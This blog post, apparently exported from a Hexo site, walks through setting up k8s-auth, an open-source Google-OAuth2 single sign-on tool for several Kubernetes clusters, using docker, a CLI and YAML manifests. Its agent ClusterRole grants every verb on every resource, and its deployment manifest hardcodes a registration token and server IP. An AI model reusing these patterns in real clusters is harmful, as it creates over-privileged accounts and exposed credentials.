\n\n\n![](https://imgur.com/F1EVKK3.png)\n\n## How to interact with this Server\n\nK8s-Auth Server comes with a powerful CLI utility that can be used by both administrators and users. The CLI behaves differently based on the user's role - administrators can create, modify, and delete users, groups, and clusters, while normal users can check the clusters that they are authorized to connect with. Once the users selects the cluster they want to authenticate with, the CLI will automatically generate a kubeconfig file, making it easy for users to connect to the cluster and start working. \n\n## How users logs to the server\n\nTo connect to any cluster, users must first authenticate with the K8s-Auth Server. Authentication with the server is done using OAuth2 with Google, allowing users to use one set of credentials to connect to multiple clusters with different permissions based on their role on each cluster. This type of authentication can be referred to as SSO-based authentication. \n\n## What happen when user want to authenticate to a cluster ?\n\nOn the user side, when a user logs into the K8s-Auth Server, they can check the clusters they are authorized to access. After selecting the desired cluster, a request is sent to the server, which checks if the user is authorized to connect. If authorized, the server sends a request to the specific agent/controller, which creates the necessary Kubernetes resources, such as service accounts, roles, role bindings, and secrets, allowing the user to connect to the cluster and return the token and ca.crt that allow the automatic generation of the kubeconfig. \n\n## The Agent/Controller role \n\nThe agent/controller also manages the lifecycle of the secret and token, deleting them and all related roles and bindings after they expire or are no longer needed. For example, if an administrator decides to remove a user from a cluster, the agent/controller will delete the secret that holds the user's token, as well as the service account, roles, and bindings associated with that user. \n\n## Before DEMO \n\n\n> Please note that this project is open source and the code is available to anyone interested. It is currently an MVP version that functions effectively, and we plan to add more features in the future.\n\n\n\n> Don't forget that this project is open to contributions from the community! If you find a bug or have a feature request, feel free to open an issue on the project's GitHub page. And if you're interested in helping out with the development, pull requests are always welcome! Let's work together to make this project even better.\n\n\n\n{% links %}\n- site: k8s-auth-server\n  url: https://github.com/Mohamed-Rafraf/k8s-auth-server\n  desc: The authentication server \n  image: https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png\n  color: \"#2296fd\"\n- site: k8s-auth-kube\n  desc: The Controller/Agent for k8s-auth\n  url:  https://github.com/Mohamed-Rafraf/k8s-auth-kube\n  image: https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png\n  color: \"#de2336\"\n- site: k8s-auth-cli\n  desc: The CLI utility for k8s-auth\n  url: https://github.com/Mohamed-Rafraf/k8s-auth-cli\n  image: https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png\n  color: \"#02bf1b\"\n{% endlinks %}\n\n# The DEMO ! \n\nAnd the icing on the cake? I am going to show you how to set up and use k8s-auth in a demo that will blow your mind (in a good way, of course). So grab your popcorn and let's get this Kubernetes party started!\n\nLadies and Gentlemen, it's showtime! Let's get ready to k8s-authenticate! We'll be putting the spotlight on three stars of this demo: The Authentication Server, The Agent/Controller, and the Command Line Utility! These babies were born to shine in the Go language (talk about power!) and are all open-source, so you can check them out on my GitHub page. And, to make things even easier, we've containerized the authentication server and agent, so you can just pull them like a cold one on a hot summer day. Check out my Docker Hub profile for more juicy details!\n\n## Setting up Authentication Server\n\nHold your horses, folks! The authentication server may be containerized, but it's not going inside Kubernetes! Don't forget to set up those environment variables for the server - especially the admin email! (He deserve a name and a full name too, don't they?) And guess what, the admin can log in with Google OAuth2! Just make sure to give the Client ID, Client Secret, and Redirection Link, or else things won't work too smoothly.\n\n> You need to create an OAuth 2.0 Client with the Google API in google cloud platform!\n\n![](https://imgur.com/YqhD79J.png)\n\n* `K8S_AUTH_ADMIN_NAME`: The administrator name! (My name is default value)\n* `K8S_AUTH_ADMIN_FULLNAME`: The administrator name! (My name is default value)\n* `K8S_AUTH_ADMIN_MAIL`: The administrator name! (My email is default value)\n* `OAUTH2_CLIENT_ID`: The google Oauth2 Client ID (Required)\n* `OAUTH2_CLIENT_SECRET`: The google Oauth2 Secret  (Required)\n* `OAUTH2_REDIRECT_URL`: The google Oauth2 Redirect URL callback (Required, it must be redirected to /callback endpoint of your server ) \n\n> Let's assume that the server is deployed on https://auth.4n6nk8s.tech,\n`OAUTH2_REDIRECT_URL` must be https://auth.4n6nk8s.tech/callback\n\nIt's docker time! `mohamedrafraf/k8s-auth-server` is the docker image that you need! Let's run this server! \n\n```bash run server\ndocker run --name server -it -p 80:8080 -e OAUTH2_CLIENT_ID=xxxx -e OAUTH2_CLIENT_SECRET=xxx ... mohamedrafraf/k8s-auth-server\n```\n\n\nMake sure to input all the necessary variables for the server to run smoothly. And once you've done that, sit back and relax, and let the server do its thing! Keep your hands off those logs, let them flow in peace!\n\n## Interacting with server using k8s-auth CLI \n\nIt's CLI installation time, folks! This nifty command line utility is your ticket to the k8s-auth party. With the CLI, you can log in as an admin or regular user and interact with the server based on your permission level.\n\nBut wait, there's more! For the first time, only the admin with their fancy schmancy email address can access the server. They'll be the ones registering the cluster, setting up the agent, and creating a connection between the server and the agent. Then, it's time to have some fun with users, groups, and permissions. Who said authentication couldn't be funny?\n\nYou can build the command line utility or download it by running: \n```bash download cli\nwget https://github.com/Mohamed-Rafraf/k8s-auth-cli/releases/download/test/k8s-auth\nsudo chmod +x k8s-auth && sudo mv k8s-auth /usr/bin\n```\nNow, you can use this command line utility just like any other tool in your system! \n\n![](https://imgur.com/EciPajC.png)\n\n\nBefore start playing with this command line you need to know that on each command you need to specify the authentication server that you want to interact with! So either you user `--server` on each command or use `K8S_AUTH_SERVER` environment variable to make it more easy for you! I'll go with the 2nd option!\n\n```bash export env var\nexport K8S_AUTH_SEVER=https://auth.4n6nk8s.tech\n```\n\nNow you need to log in as an adminstrator! It's not that hard just run `k8s-auth login` and forget to specify `--admin` to login as the super user!\n\n![](https://imgur.com/10prjzn.png)\n\nThe utility needs a secret token, which you'll get from an URL link. This link will take you to Google for authentication and authorization as an admin. Once you're authorized, you'll get the secret token to paste and everything will be good to go. \n\nYou'll get something like this one in case you're authorized! \n![](https://imgur.com/Yt9FZgD.png)\n\nCopy that thing don't worry! Once you paste it, the utility will verify the token and let you know if you're ready for your actions or not! \n\n![](https://imgur.com/MY7TTOZ.png)\n\nBingo we are ready for action! Now as an admin you can register clusters, create,delete,modify users and groups (and their permissions) inside each cluster!\n\n> Let's assume that you have 2 clusters! You create a user inside cluster1 and you give him permission to list pods on dev namespace. You can add that user to cluster2 with other permission like create secrets on prod namespace\n\nIt's time to register a cluster! You'll recieve a secret token.\n\n![](https://imgur.com/yvANfkB.png)\n\nAnd as you see here! The cluster is registered using `k8s-auth create cluster` and you can list registred clusters with `k8s-auth get clusters`\n\n> Keep in mind that registerd cluster have 2 status, not Active when the cluster is not verified yet. The Active status will show you the API SERVER address/hostname\n\n> Only Admins can see the tokens! Running the same command as a regular user will list you only the clusters that you have access to it (so not all cluster) and without the token! \n\nLet's take rest now from the CLI. It's time for kubernetes! Let's deploy the agent/controller that will communicate with the server! \n\n## Deploy the Agent/Controller inside Kubernetes\nDeploying the agent is not rocket science! Deploying the agent is not rocket science! (To be honest i didn't make a helm chart yet, Sadly :( ). But if you want to do it the old fashioned way, no worries! It's still a piece of cake. Just keep in mind that you need to create a namespace called \"k8s-auth\" in your cluster. This namespace will contain all the service accounts and secrets of the users that authenticate and have a session with the cluster.\n\nThe agent's mission is to make sure everyone gets what they need! It creates service accounts, roles, and role bindings to make sure users have the right permissions in the cluster. That's why the agent itself needs a service account and permissions to do its job inside the cluster.\n\n\nLet's create the namespace and the service account for this agent! \n\n```yaml create ns & sa\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: k8s-auth\nspec: {}\nstatus: {}\n---\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: k8s-auth\n  namespace: k8s-auth\n```\n\nThis service account need a clusterrole that allow to create roles to anything!  to grant permission for creating pods you must have this permission first! You can't give permission of create something and you can't do it!!! \n\nNext, the service account will need an appropriate permissions to carry out its mission inside the cluster. Specifically, it requires a clusterrole that grants permission to create roles for any resource. \n\nIn kubernetes world, granting permission to create something requires that you have the permission yourself!. For example, you can't grant permission to create pods if you don't have permission to create pods even you have permission to create roles!!\n\nLet's create the clusterole and the binding! \n\n````yaml create cluster role\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  creationTimestamp: null\n  name: k8s-auth\nrules:\n- apiGroups: [\"*\"]\n  resources: [\"*\"]\n  verbs: [\"*\"]\n\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  creationTimestamp: null\n  name: k8s-auth\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: k8s-auth\nsubjects:\n- kind: ServiceAccount\n  name: k8s-auth\n  namespace: k8s-auth\n````\nNow it's time to the last part! we will deploy the agent itself! The agent need to know some information so as expected there is some environement variable! \n\n* `CLUSTER_NAME`: is the same name that you put it inside the authentication server \n* `TOKEN`: The generated token from the authentication server\n* `SERVER`: The authentication server itself\n* `API_SERVER`: This is contains the public hostname for the API SERVER. The agent can detect it correctly when you have a cluster inside Network and the cluster is not exposed in the internet \n\n> I used kubeadm clusters in provisionning clusters. I didn't find a way to find the public hostname! So you need to indicate the api server until it will be fixed!\n\n```yaml deploy\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  creationTimestamp: null\n  labels:\n    app: k8s-auth\n  name: k8s-auth\n  namespace: k8s-auth\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k8s-auth\n  strategy: {}\n  template:\n    metadata:\n      creationTimestamp: null\n      labels:\n        app: k8s-auth\n    spec:\n      serviceAccountName: k8s-auth\n      containers:\n      - image: mohamedrafraf/k8s-auth-kube \n        name: k8s-auth-kube\n        env:\n          - name: CLUSTER_NAME\n            value: ctf-cluster\n          - name: TOKEN\n            value: \"Z8taw1yFw4lsq7cgSvmZ\"\n          - name: SERVER\n            value: \"https://auth.4n6nk8s.tech\"\n          - name: API_SERVER\n            value: https://172.190.91.84:6443\n        resources: {}\n\nstatus: {}\n```\n\nAfter deploying the agent. you can check the clusters with the cli again and you'll find everything is ok! \n![](https://imgur.com/MqHeeY1.png)\n\nThe cluster is on Active status and the api server is not empty now! You can repeat this operation with many clusters and this is how multi-clusters can work together! \n\n## Create Users and Groups \n\nThe cluster is now ready for authentication and has been verified to be functioning without any issues. The connection between the cluster and authentication has been established. Now, let's proceed to creating groups and users.\n\nLet's see what `k8s-auth create` can do for us! \n\n![](2023-04-29-15-56-38.png)\n\nGreat news! With the `k8s-auth create` command, you can easily create groups and users for your authenticated clusters. To create a group, simply specify the cluster and provide a YAML manifest file containing the roles for that group. For creating a user, you can either assign them to an existing group or provide a YAML manifest file for the user's roles if they do not belong to any group.\n\nLet's define the role for our group that we will create!\n\n```yaml group rule\nkind: Role\napiVersion: rbac.authorization.k8s.io/v1\nmetadata:\n  namespace: dev\n  name: pod-and-secret\nrules:\n- apiGroups: [\"\"]\n  resources: [\"pods\",\"secrets\"]\n  verbs: [\"list\",\"create\"]\n\n---\nkind: Role\napiVersion: rbac.authorization.k8s.io/v1\nmetadata:\n  namespace: prod\n  name: pod-list\nrules:\n- apiGroups: [\"\"]\n  resources: [\"pods\"]\n  verbs: [\"list\"]\n``` \n\nThe group we're about to create will be granted permission to create and list pods and secrets in the \"dev\" namespace, while they will only be able to list pods in the \"prod\" namespace.\n\n> Any user will be belong to this group will have these permissions! You don't have to repeat the same manifest for each user!. This is why groups exists! \n\nThis command will create the group for you \n```bash command\nk8s-auth create group <name> --cluster=<cluster> --file=<rbac_file>\n```\n![](https://imgur.com/g5YBB8u.png)\n\nAs you can see here! The group is create successfully and you can see his permission when you forget it using `k8s-auth get permission` command! \n\nYou can discover what you can do with `k8s-auth get` command!! You can a list users too! \n\n![](https://imgur.com/MOC7L1o.png)\n\nNow let's create a user that belong to this group! So we don't need to specify any manifest file that define roles! \n\n```bash user\nk8s-auth create user --name <name> --fullname <value> --mail <mail> --cluster <cluster> --group <group>\n```\n\nIn case that you want to create a user that don't belongs to any group and have his own permission you can delete the `--group` and change it with `--file` and specify the yaml file that contains his roles! \n\n> No need to worry about naming roles because there won't be any overlapping between them. The agent takes care of creating roles and bindings in the background, and the names you specify in the manifest won't be used directly.\n\n![](https://imgur.com/n2S8BQM.png)\n\nYou can update the permission using the `k8s-auth update permisssion` command! This command can update groups and users permission\n\nIn case you change the permission for a user that belgons to a group. This user will leave that group because he will have his own permissions (different from the group one)\n\n\n> You can't delete a group if is not empty!\n\n> When User have an opened session with a cluster and use kubectl normally and you decide to delete that user the session will be closed and he can't do anything! \n\n## Authenticate to a cluster\n\nAs a regular user you need to login to the authentication server using `k8s-auth login` and you'll receive a link as the admin login process! \n\nThen you can list the clusters that you can authenticate with using `k8s-auth get clusters` and keep in your mind that you'll never see the token of each cluster (Only admins can see tokens)\n\nOnce you decided which cluster you'll authenticate! run the command `k8s-auth auth` with specifying the cluster name!\n\n```bash authenticate\nk8s-auth auth cluster=ctf-cluster\n\nTo use this cluster run this command: export KUBECONFIG=$HOME/.k8s-auth.config\n```\n\nIf you're authorized, you'll receive a message like that! What is happening? \n\nActually the k8s-auth CLI generate a kubeconfig file for you! run the command that the CLI suggest to you! BOOOM Start Kubectlying !!! xD \n\n\n## Conclusion\n\nAs highlighted in the blog post, the process of authentication has been simplified with just 3 simple commands - login, auth, and export KUBECONFIG. These commands enable users to easily open a session with any cluster they want, regardless of the number of clusters and different permissions required, using just a single set of credentials. Additionally, the administrator can easily set up agents in the clusters, and manage the permissions and the entire process centrally using a smooth command line interface.","slug":"Kubernetes/k8s-auth","published":1,"updated":"2023-04-29T17:04:09.529Z","_id":"clh23bah80000c7qf90btf5ac","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"introduction\"><a class=\"markdownIt-Anchor\" href=\"#introduction\">#</a> Introduction</h1>\n<h2 id=\"how-it-comes\"><a class=\"markdownIt-Anchor\" href=\"#how-it-comes\">#</a> How it comes</h2>\n<p>As a university student, I was assigned to create an authentication project for a specific system. But instead of choosing a traditional approach like Kerberos, I decided to spice things up and bring Kubernetes and cloud-native technologies into the mix (Typical Me). After diving into the official documentation, I was hit with a barrage of authentication strategies like X509 client certs, Static Token File, Bootstrap tokens, Service Accounts, OIDC tokens, and more. My head was spinning! Then I stumbled upon some existing authentication tools like Dex, Keycloak, and Pinniped. Terms like OIDC and OAuth2 were thrown around left and right. But I wasn’t intimidated! I accepted the challenge and declared: “It’s implementation time!” And thus, the k8s-auth project was born.</p>\n<h2 id=\"why-k8s-auth-is-born\"><a class=\"markdownIt-Anchor\" href=\"#why-k8s-auth-is-born\">#</a> Why k8s-auth is born</h2>\n<p>Managing access to Kubernetes clusters can be a challenging task, especially in large organizations where multiple teams and users need different levels of permissions. While Kubernetes provides a robust RBAC system, configuring and maintaining it can be time-consuming and error-prone, particularly if you have many clusters to manage.<br>\nIt can feel like you’re playing a never-ending game of whack-a-mole, trying to keep up with the constant changes and updates. And let’s be honest, it’s not the most exciting task in the world. Moving from one cluster to another, constantly changing contexts, generating kubeconfig for users, and dealing with permission problems can quickly become a chore.</p>\n<p><img data-src=\"https://imgur.com/a5zaVhH.png\" alt=\"\"></p>\n<h2 id=\"before-starting\"><a class=\"markdownIt-Anchor\" href=\"#before-starting\">#</a> Before Starting</h2>\n<p>Before you start reading this blog post, let’s make sure you’re ready to dive into the k8s-auth server world. First, make sure you have a solid understanding of Kubernetes basics and RBAC, as we’ll be building on those concepts. Don’t worry, we won’t ask you to explain any Kubernetes concept in binary code. We just need you to understand what a service account is, what roles and role bindings mean, and why a service account needs a secret. So, if these concepts are still a mystery to you, go ahead and brush up on your Kubernetes knowledge before jumping in. And if you need a refresher, don’t worry, we won’t judge you. We’ll just send you back to Kubernetes school.</p>\n<h1 id=\"k8s-auth-the-sso-based-authentication-mechanism-for-multi-clusters\"><a class=\"markdownIt-Anchor\" href=\"#k8s-auth-the-sso-based-authentication-mechanism-for-multi-clusters\">#</a> K8S-AUTH : The SSO-Based Authentication Mechanism for Multi-Clusters!</h1>\n<h2 id=\"what-is-k8s-auth\"><a class=\"markdownIt-Anchor\" href=\"#what-is-k8s-auth\">#</a> What is k8s-auth ?</h2>\n<p>K8s-auth is a tool that provides authentication and authorization mechanisms for multiple Kubernetes clusters. With k8s-auth, users can authenticate to multiple clusters using a single set of credentials. This eliminates the need for users to have different credentials for different clusters, simplifying the authentication process. K8s-auth also allows administrators to manage user and group permissions across multiple clusters from a single centralized location, making it easier to maintain security and access control.</p>\n<p><img data-src=\"https://imgur.com/awkZvAb.png\" alt=\"\"></p>\n<h2 id=\"the-authentication-server\"><a class=\"markdownIt-Anchor\" href=\"#the-authentication-server\">#</a> The Authentication server</h2>\n<p>“K8s-Auth Server” is an open-source authentication server designed to simplify the authorization and authentication process for users and groups within specific Kubernetes clusters. With this server, administrators can easily manage access controls for multiple clusters, all from a centralized location.</p>\n<p>With the k8s-auth server, you can say goodbye to the headache of managing RBAC configurations across multiple clusters. Instead, you can focus on the fun part of being an admin - creating users, deleting users, modifying users, creating groups, deleting groups, modifying groups, and more! And the best part? You get to do it all with a single set of credentials, like a master key that unlocks all the doors to the kingdom of Kubernetes.</p>\n<p>But wait, there’s more! With SSO-based access, users can connect to multiple clusters with different permissions based on their role on each cluster, all without having to enter a password a million times. It’s like having a backstage pass to all the coolest Kubernetes events without ever having to wait in line.</p>\n<h2 id=\"how-this-server-communicate-with-clusters\"><a class=\"markdownIt-Anchor\" href=\"#how-this-server-communicate-with-clusters\">#</a> How This Server Communicate with Clusters ?</h2>\n<p>K8s-Auth Server is designed to work seamlessly with K8s-Auth Controller, a cloud-native application that is deployed within the Kubernetes cluster. This controller acts as an agent for the server, facilitating communication between the server and the cluster.</p>\n<p><img data-src=\"https://imgur.com/0PK9Sj5.png\" alt=\"\"></p>\n<p>Before a cluster can be used with K8s-Auth Server, it must be registered with the server by the administrator. When a cluster is registered, a secret token is created, which must be used by the agent/controller deployed within the cluster to verify its existence. Once the agent/controller is verified, a connection between the cluster and the server is opened (web socket) for data communication.</p>\n<p><img data-src=\"https://imgur.com/F1EVKK3.png\" alt=\"\"></p>\n<h2 id=\"how-to-interact-with-this-server\"><a class=\"markdownIt-Anchor\" href=\"#how-to-interact-with-this-server\">#</a> How to interact with this Server</h2>\n<p>K8s-Auth Server comes with a powerful CLI utility that can be used by both administrators and users. The CLI behaves differently based on the user’s role - administrators can create, modify, and delete users, groups, and clusters, while normal users can check the clusters that they are authorized to connect with. Once the users selects the cluster they want to authenticate with, the CLI will automatically generate a kubeconfig file, making it easy for users to connect to the cluster and start working.</p>\n<h2 id=\"how-users-logs-to-the-server\"><a class=\"markdownIt-Anchor\" href=\"#how-users-logs-to-the-server\">#</a> How users logs to the server</h2>\n<p>To connect to any cluster, users must first authenticate with the K8s-Auth Server. Authentication with the server is done using OAuth2 with Google, allowing users to use one set of credentials to connect to multiple clusters with different permissions based on their role on each cluster. This type of authentication can be referred to as SSO-based authentication.</p>\n<h2 id=\"what-happen-when-user-want-to-authenticate-to-a-cluster\"><a class=\"markdownIt-Anchor\" href=\"#what-happen-when-user-want-to-authenticate-to-a-cluster\">#</a> What happen when user want to authenticate to a cluster ?</h2>\n<p>On the user side, when a user logs into the K8s-Auth Server, they can check the clusters they are authorized to access. After selecting the desired cluster, a request is sent to the server, which checks if the user is authorized to connect. If authorized, the server sends a request to the specific agent/controller, which creates the necessary Kubernetes resources, such as service accounts, roles, role bindings, and secrets, allowing the user to connect to the cluster and return the token and ca.crt that allow the automatic generation of the kubeconfig.</p>\n<h2 id=\"the-agentcontroller-role\"><a class=\"markdownIt-Anchor\" href=\"#the-agentcontroller-role\">#</a> The Agent/Controller role</h2>\n<p>The agent/controller also manages the lifecycle of the secret and token, deleting them and all related roles and bindings after they expire or are no longer needed. For example, if an administrator decides to remove a user from a cluster, the agent/controller will delete the secret that holds the user’s token, as well as the service account, roles, and bindings associated with that user.</p>\n<h2 id=\"before-demo\"><a class=\"markdownIt-Anchor\" href=\"#before-demo\">#</a> Before DEMO</h2>\n<blockquote>\n<p>Please note that this project is open source and the code is available to anyone interested. It is currently an MVP version that functions effectively, and we plan to add more features in the future.</p>\n</blockquote>\n<blockquote>\n<p>Don’t forget that this project is open to contributions from the community! If you find a bug or have a feature request, feel free to open an issue on the project’s GitHub page. And if you’re interested in helping out with the development, pull requests are always welcome! Let’s work together to make this project even better.</p>\n</blockquote>\n<div class=\"links\"><div class=\"item\" title=\"k8s-auth-server\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLXNlcnZlcg==\" data-background-image=\"https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLXNlcnZlcg==\">k8s-auth-server</span>\n          <p class=\"desc\">The authentication server</p>\n          </div></div><div class=\"item\" title=\"k8s-auth-kube\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLWt1YmU=\" data-background-image=\"https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLWt1YmU=\">k8s-auth-kube</span>\n          <p class=\"desc\">The Controller/Agent for k8s-auth</p>\n          </div></div><div class=\"item\" title=\"k8s-auth-cli\" style=\"--block-color:#02bf1b;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLWNsaQ==\" data-background-image=\"https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLWNsaQ==\">k8s-auth-cli</span>\n          <p class=\"desc\">The CLI utility for k8s-auth</p>\n          </div></div></div>\n<h1 id=\"the-demo\"><a class=\"markdownIt-Anchor\" href=\"#the-demo\">#</a> The DEMO !</h1>\n<p>And the icing on the cake? I am going to show you how to set up and use k8s-auth in a demo that will blow your mind (in a good way, of course). So grab your popcorn and let’s get this Kubernetes party started!</p>\n<p>Ladies and Gentlemen, it’s showtime! Let’s get ready to k8s-authenticate! We’ll be putting the spotlight on three stars of this demo: The Authentication Server, The Agent/Controller, and the Command Line Utility! These babies were born to shine in the Go language (talk about power!) and are all open-source, so you can check them out on my GitHub page. And, to make things even easier, we’ve containerized the authentication server and agent, so you can just pull them like a cold one on a hot summer day. Check out my Docker Hub profile for more juicy details!</p>\n<h2 id=\"setting-up-authentication-server\"><a class=\"markdownIt-Anchor\" href=\"#setting-up-authentication-server\">#</a> Setting up Authentication Server</h2>\n<p>Hold your horses, folks! The authentication server may be containerized, but it’s not going inside Kubernetes! Don’t forget to set up those environment variables for the server - especially the admin email! (He deserve a name and a full name too, don’t they?) And guess what, the admin can log in with Google OAuth2! Just make sure to give the Client ID, Client Secret, and Redirection Link, or else things won’t work too smoothly.</p>\n<blockquote>\n<p>You need to create an OAuth 2.0 Client with the Google API in google cloud platform!</p>\n</blockquote>\n<p><img data-src=\"https://imgur.com/YqhD79J.png\" alt=\"\"></p>\n<ul>\n<li><code>K8S_AUTH_ADMIN_NAME</code> : The administrator name! (My name is default value)</li>\n<li><code>K8S_AUTH_ADMIN_FULLNAME</code> : The administrator name! (My name is default value)</li>\n<li><code>K8S_AUTH_ADMIN_MAIL</code> : The administrator name! (My email is default value)</li>\n<li><code>OAUTH2_CLIENT_ID</code> : The google Oauth2 Client ID (Required)</li>\n<li><code>OAUTH2_CLIENT_SECRET</code> : The google Oauth2 Secret  (Required)</li>\n<li><code>OAUTH2_REDIRECT_URL</code> : The google Oauth2 Redirect URL callback (Required, it must be redirected to /callback endpoint of your server )</li>\n</ul>\n<blockquote>\n<p>Let’s assume that the server is deployed on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9hdXRoLjRuNm5rOHMudGVjaA==\">https://auth.4n6nk8s.tech</span>,<br>\n <code>OAUTH2_REDIRECT_URL</code>  must be <span class=\"exturl\" data-url=\"aHR0cHM6Ly9hdXRoLjRuNm5rOHMudGVjaC9jYWxsYmFjaw==\">https://auth.4n6nk8s.tech/callback</span></p>\n</blockquote>\n<p>It’s docker time!  <code>mohamedrafraf/k8s-auth-server</code>  is the docker image that you need! Let’s run this server!</p>\n<figure class=\"highlight bash\"><figcaption><span>run server</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run --name server -it -p 80:8080 -e OAUTH2_CLIENT_ID=xxxx -e OAUTH2_CLIENT_SECRET=xxx ... mohamedrafraf/k8s-auth-server</span><br></pre></td></tr></table></figure>\n<p>Make sure to input all the necessary variables for the server to run smoothly. And once you’ve done that, sit back and relax, and let the server do its thing! Keep your hands off those logs, let them flow in peace!</p>\n<h2 id=\"interacting-with-server-using-k8s-auth-cli\"><a class=\"markdownIt-Anchor\" href=\"#interacting-with-server-using-k8s-auth-cli\">#</a> Interacting with server using k8s-auth CLI</h2>\n<p>It’s CLI installation time, folks! This nifty command line utility is your ticket to the k8s-auth party. With the CLI, you can log in as an admin or regular user and interact with the server based on your permission level.</p>\n<p>But wait, there’s more! For the first time, only the admin with their fancy schmancy email address can access the server. They’ll be the ones registering the cluster, setting up the agent, and creating a connection between the server and the agent. Then, it’s time to have some fun with users, groups, and permissions. Who said authentication couldn’t be funny?</p>\n<p>You can build the command line utility or download it by running:</p>\n<figure class=\"highlight bash\"><figcaption><span>download cli</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/Mohamed-Rafraf/k8s-auth-cli/releases/download/test/k8s-auth</span><br><span class=\"line\">sudo <span class=\"built_in\">chmod</span> +x k8s-auth &amp;&amp; sudo <span class=\"built_in\">mv</span> k8s-auth /usr/bin</span><br></pre></td></tr></table></figure>\n<p>Now, you can use this command line utility just like any other tool in your system!</p>\n<p><img data-src=\"https://imgur.com/EciPajC.png\" alt=\"\"></p>\n<p>Before start playing with this command line you need to know that on each command you need to specify the authentication server that you want to interact with! So either you user  <code>--server</code>  on each command or use  <code>K8S_AUTH_SERVER</code>  environment variable to make it more easy for you! I’ll go with the 2nd option!</p>\n<figure class=\"highlight bash\"><figcaption><span>export env var</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> K8S_AUTH_SEVER=https://auth.4n6nk8s.tech</span><br></pre></td></tr></table></figure>\n<p>Now you need to log in as an adminstrator! It’s not that hard just run  <code>k8s-auth login</code>  and forget to specify  <code>--admin</code>  to login as the super user!</p>\n<p><img data-src=\"https://imgur.com/10prjzn.png\" alt=\"\"></p>\n<p>The utility needs a secret token, which you’ll get from an URL link. This link will take you to Google for authentication and authorization as an admin. Once you’re authorized, you’ll get the secret token to paste and everything will be good to go.</p>\n<p>You’ll get something like this one in case you’re authorized!<br>\n<img data-src=\"https://imgur.com/Yt9FZgD.png\" alt=\"\"></p>\n<p>Copy that thing don’t worry! Once you paste it, the utility will verify the token and let you know if you’re ready for your actions or not!</p>\n<p><img data-src=\"https://imgur.com/MY7TTOZ.png\" alt=\"\"></p>\n<p>Bingo we are ready for action! Now as an admin you can register clusters, create,delete,modify users and groups (and their permissions) inside each cluster!</p>\n<blockquote>\n<p>Let’s assume that you have 2 clusters! You create a user inside cluster1 and you give him permission to list pods on dev namespace. You can add that user to cluster2 with other permission like create secrets on prod namespace</p>\n</blockquote>\n<p>It’s time to register a cluster! You’ll recieve a secret token.</p>\n<p><img data-src=\"https://imgur.com/yvANfkB.png\" alt=\"\"></p>\n<p>And as you see here! The cluster is registered using  <code>k8s-auth create cluster</code>  and you can list registred clusters with  <code>k8s-auth get clusters</code></p>\n<blockquote>\n<p>Keep in mind that registerd cluster have 2 status, not Active when the cluster is not verified yet. The Active status will show you the API SERVER address/hostname</p>\n</blockquote>\n<blockquote>\n<p>Only Admins can see the tokens! Running the same command as a regular user will list you only the clusters that you have access to it (so not all cluster) and without the token!</p>\n</blockquote>\n<p>Let’s take rest now from the CLI. It’s time for kubernetes! Let’s deploy the agent/controller that will communicate with the server!</p>\n<h2 id=\"deploy-the-agentcontroller-inside-kubernetes\"><a class=\"markdownIt-Anchor\" href=\"#deploy-the-agentcontroller-inside-kubernetes\">#</a> Deploy the Agent/Controller inside Kubernetes</h2>\n<p>Deploying the agent is not rocket science! Deploying the agent is not rocket science! (To be honest i didn’t make a helm chart yet, Sadly 😦 ). But if you want to do it the old fashioned way, no worries! It’s still a piece of cake. Just keep in mind that you need to create a namespace called “k8s-auth” in your cluster. This namespace will contain all the service accounts and secrets of the users that authenticate and have a session with the cluster.</p>\n<p>The agent’s mission is to make sure everyone gets what they need! It creates service accounts, roles, and role bindings to make sure users have the right permissions in the cluster. That’s why the agent itself needs a service account and permissions to do its job inside the cluster.</p>\n<p>Let’s create the namespace and the service account for this agent!</p>\n<figure class=\"highlight yaml\"><figcaption><span>create ns & sa</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span 